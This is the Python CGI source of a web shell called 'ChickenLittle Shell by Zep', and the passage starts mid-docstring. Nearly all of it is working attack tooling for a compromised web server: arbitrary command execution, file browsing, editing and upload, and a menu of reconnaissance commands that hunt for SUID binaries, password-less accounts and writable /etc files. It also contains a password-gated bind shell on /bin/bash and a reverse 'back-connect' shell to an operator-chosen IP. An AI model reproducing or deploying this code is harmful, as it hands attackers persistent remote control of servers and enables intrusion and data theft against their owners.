hickenLittle Shell by Zep
"""

try:
    import cgitb; cgitb.enable()
except:
    pass
import sys, cgi, os, base64, subprocess
from time import strftime
from string import Template

# HTML

html = Template("""
<html>
<head>
    <title>ChickenLittle Shell</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
    <style>
        body {
            color:#fff;
            background-color:#585858;
            font-size:11px;
        }
        table {
            font-family: Verdana, Tahoma;
            font-size:11px;
        }
        tr {
            border: #D9D9D9 1px solid;
        }
        td {
            border: #D9D9D9 1px solid;
        }
        a { 
            color: #fff;
        }
        input {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
        select {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
        textarea {
            background-color:#800000;
            color:#FFFFFF;
            font-family:Tahoma;
            font-size:8pt;
        }
    </style>
</head>
<body>
    <script type="text/javascript">
        function toggleEnviron()
        {
            if (document.getElementById('environ_table').style.display=="none")
                document.getElementById('environ_table').style.display="";
            else
                document.getElementById('environ_table').style.display="none";
        }
    </script>
    <center><h2>=== ChickenLittle Shell ===</h2></center>
    <a href="javascript:void(0)" onclick="javascript:toggleEnviron()">Show/Hide Environment variables</a>
    $environ_table
    <p />
    <table width="100%">
        <tr><td>
            uname -a: $uname <br />
            $uid
        </td></tr>
    </table>
    <p />
    <div style="display:$edit_file_box_visibility">
        <b>Edit File:</b> <br />
        <form method="POST" action="?">
            <textarea name="file_content" cols="200" rows="30" >$file_content</textarea>
            <input type="hidden" value="$cur_dir" size="50" name="cur_dir" /> <br />
            <input type="hidden" value="save_file" size="50" name="command" /> <br />
            <input type="hidden" value="$file_name" size="50" name="file_name" /> <br />
            <input type="submit" value="Save">       
        </form>
        <p />
    </div>
    <table width="100%">
        <tr>    
            <td style="text-align:center">
                <b>:: Change Dir ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="cur_dir">&nbsp;<input type="submit" value="Go">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Get File ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="cur_dir">&nbsp;<input type="submit" value="Go">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>
            <td colspan="2" style="text-align:center"><b>$cur_dir</b></td>
        </tr>
        <tr>
            <td><pre>$list_files</pre></td>
        </tr>
    </table>
    <p />
    <b>Result of command</b><br />
    <table width="100%">
        <tr>
            <td>
                <textarea cols="200" rows="10">$command_result</textarea>
            </td>
        </tr>
    </table>
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Execute Command ::</b><br />
                <form action="?" method="POST">
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="text" value="" size="50" name="command">&nbsp;<input type="submit" value="Execute">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Useful Commands ::</b><br />
                <form action="?" method="POST">
                    <select name="command">
                        <option value="uname -a">Kernel version</option>
                        <option value="w">Logged in users</option>
                        <option value="lastlog">Last to connect</option>
                        <option value="find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null">Suid bins</option>
                        <option value="cut -d: -f1,2,3 /etc/passwd | grep ::">USER WITHOUT PASSWORD!</option>
                        <option value="find /etc/ -type f -perm -o+w 2> /dev/null">Write in /etc/?</option>
                        <option value="which wget curl w3m lynx">Downloaders?</option>
                        <option value="cat /proc/version /proc/cpuinfo">CPUINFO</option>
                        <option value="netstat -atup | grep IST">Open ports</option>
                        <option value="locate gcc">gcc installed?</option>
                    </select>
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="submit" value="Go" />
                </form>
            </td>
        </tr>
    </table>    
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Create Dir ::</b><br />
                <form action="?" method="POST">
                    <input type="text" value="$cur_dir" size="50" name="new_dir">&nbsp;<input type="submit" value="Create">
                    <input type="hidden" value="mkdir" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center">
                <b>:: Upload File ::</b><br />
                <form action="?" method="POST" enctype="multipart/form-data">
                    <input type="file" name="file">&nbsp;<input type="submit" value="Upload">
                    <input type="hidden" value="upload" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Search Text in Files ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">Text: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="search_text" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Directory: </td>
                            <td style="border:none"><input type="text" value="$cur_dir" size="30" name="search_dir" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Include File Pattern: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="include_pattern" /></td>
                        </tr>
                        <tr>
                             <td width="50%" style="border:none;text-align:right">Exclude File Pattern: </td>
                            <td style="border:none"><input type="text" value="" size="30" name="exclude_pattern" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Search">
                    <input type="hidden" value="search_text" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center;vertical-align:top">
                <b>:: Edit File ::</b><br />
                <form action="?" method="POST">
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir" />
                    <input type="hidden" value="edit_file" size="50" name="command">
                    <input type="text" value="$cur_dir" size="50" name="file_name">
                    &nbsp;<input type="submit" value="Edit">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>    
            <td style="text-align:center" width="50%">
                <b>:: Bind port to /bin/bash ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">Port: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="port" /></td>
                        </tr>
                        <tr>
                            <td style="border:none;text-align:right">Password: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="password" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Bind">
                    <input type="hidden" value="bind_port" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
            <td style="text-align:center" width="50%">
                <b>:: back-connect ::</b><br />
                <form action="?" method="POST">
                    <table width="100%">
                        <tr>
                            <td width="50%" style="border:none;text-align:right">IP: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="ip" /></td>
                        </tr>
                        <tr>
                            <td style="border:none;text-align:right">Port: </td>
                            <td style="border:none"><input type="text" value="" size="10" name="port" /></td>
                        </tr>
                    </table>
                    <input type="submit" value="Connect">
                    <input type="hidden" value="back_connect" size="50" name="command" />
                    <input type="hidden" value="$cur_dir" size="50" name="cur_dir">
                </form>
            </td>
        </tr>
    </table>
    <p />
    <table width="100%">
        <tr>
            <td style="text-align:center"><b>(.)(.) [ChickenLittle Shell by Zep] (.)(.)</b></td>
        </tr>
    </table>
</body>
</html>
""")

scriptname = ""

if os.environ.has_key("SCRIPT_NAME"):
    scriptname = os.environ["SCRIPT_NAME"]

def bind_port():
    import socket
    try:
        PORT = int(sys.argv[2])
        PW = sys.argv[3]
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.bind(("0.0.0.0",PORT))
        sock.listen(5)
        SHELL="/bin/bash -i"
        while True:
            try:    
                (conn,addr) = sock.accept()
                os.dup2(conn.fileno(),0)
                os.dup2(conn.fileno(),1)
                os.dup2(conn.fileno(),2)
                print >> sys.stderr, 'Password: ',
                p = conn.recv(1024)
                p = p.strip()
                if p == PW:
                    os.system("/bin/bash -i")
                else:
                    print >> sys.stderr, "Go to hell"
                conn.close()
            except Exception,e:  
                print e
                time.sleep(1)
            
    except:
        pass

def back_connect():
    import os
    try:
        HOST = sys.argv[2]
        PORT = int(sys.argv[3])
        SHELL = "/bin/bash -i"
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((HOST,PORT))
        os.dup2(sock.fileno(), 0)
        os.dup2(sock.fileno(), 1)
        os.dup2(sock.fileno(), 2)
        os.system(SHELL)
    except Exception,e:
        print e
    sock.close()

class Shell(object):

    def __init__(self):
        self.form = cgi.FieldStorage()
        self.uname = self.run_command("uname -a")
        self.uid = self.run_command("id")

        self.file_content = ""
        self.file_name = ""
        self.edit_file_box_visibility = "None"  

        self.command = self.get_param("command")

    def get_environ_table(self):
        s = "<table style=\"display:none\" id=\"environ_table\">"
        for k in os.environ:
            s+="<tr><td>%s</td><td>%s</td></tr>"%(k,os.environ[k])
        s+="</table>"
        return s

    def run_command(self,command):
        p = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)
        (i,o) = p.stdin,p.stdout
        return o.read()

    def get_param(self,param,default=None):
        if self.form.has_key(param):
            return self.form.getvalue(param)
        return default

    def can_write(self,file_name):
        try:
            f = open(file_name,"w")
            f.close()
            return True
        except:
            return False

    def put_script(self,base_name,encoded_script):
        script = base64.b64decode(encoded_script)
        i = 0
        file_name = "/tmp/"+base_name + str(i)  
        while not can_write(file_name):
            i+=1
            file_name = "/tmp/"+base_name + str(i)  
        
        f = open(file_name,"w")
        f.write(script)
        f.close()
        return file_name

    def mkdir(self):
        new_dir = self.get_param("new_dir")
        return self.run_command("mkdir " + new_dir) 

    def upload(self):
        upload_file = self.form["file"]
        try:
            f  = open(upload_file.filename,"w")
            while True:
                chunk = upload_file.file.read(1024)
                if not chunk: break
                f.write(chunk)
            f.close()
            return ""
        except Exception,e:
            return str(e)        

    def search_text(self):
        search_text = self.get_param("search_text","")
        search_dir = self.get_param("search_dir",".")
        include_pattern = self.get_param("include_pattern")
        exclude_pattern = self.get_param("exclude_pattern")
        cmd = "grep -ir \"%s\" %s " % (search_text,search_dir)
        if include_pattern:
            cmd += "--include=%s " % include_pattern
        if exclude_pattern:
            cmd += "--include=%s " % exclude_pattern
        return run_command(cmd)

    def edit_file(self):
        self.file_name = self.get_param("file_name")
        try:
            f = open(self.file_name,"r")
            self.file_content = f.read()
            f.close()
            self.edit_file_box_visibility = ""            
        except:
            self.file_content = ""
            self.edit_file_box_visibility = "None"        
            return "Cannot open file"

    def save_file(self):
        self.file_name = self.get_param("file_name")
        self.file_content = self.get_param("file_content")
        try:
            f = open(self.file_name,"w")
            f.write(self.file_content)
            f.close()
            return "Successful"
        except Exception,e:
            return "Cannot write to file"+str(e)

    def bind_port(self):
        port = self.get_param("port")
        password = self.get_param("password")
        file_name = os.path.abspath( __file__ )
        pid = subprocess.Popen(["python %s %s %s %s" % (file_name,"bind_port",port,password)],shell=True).pid
        return "Process ID : %d " % pid

    def back_connect(self):
        port = self.get_param("port")
        ip = self.get_param("ip")
        file_name = os.path.abspath( __file__ )
        pid = subprocess.Popen(["python %s %s %s %s" % (file_name,"back_connect",port,password)],shell=True).pid
        return "Process ID : %d " % pid        

    def run(self):

        print "Content-type: text/html"         # header
        print                                   # blank line

        cur_dir = self.get_param("cur_dir",os.getcwd())

        if not os.path.exists(cur_dir):
            cur_dir = os.getcwd()
        os.chdir(cur_dir)

        command_result = ""

        if self.command:
            try:
                func = self.__getattribute__(self.command)
                command_result = func()
            except:
                command_result = self.run_command(self.command)
        
        list_files = self.run_command("ls -alh " + cur_dir)

        print html.substitute(environ_table=self.get_environ_table(),
                              uname = self.uname,
                              uid = self.uid,
                              list_files = list_files,
                              cur_dir = cur_dir,
                              command_result = command_result,
                              file_content = self.file_content,
                              file_name    = self.file_name,
                              edit_file_box_visibility = self.edit_file_box_visibility
                                )
act = None
try:
    act = sys.argv[1]
except:
    pass

if act == "bind_port":
    bind_port()
elif act == "back_connect":
    back_connect()
elif __name__ == '__main__':
    shell = Shell()
    shell.run()

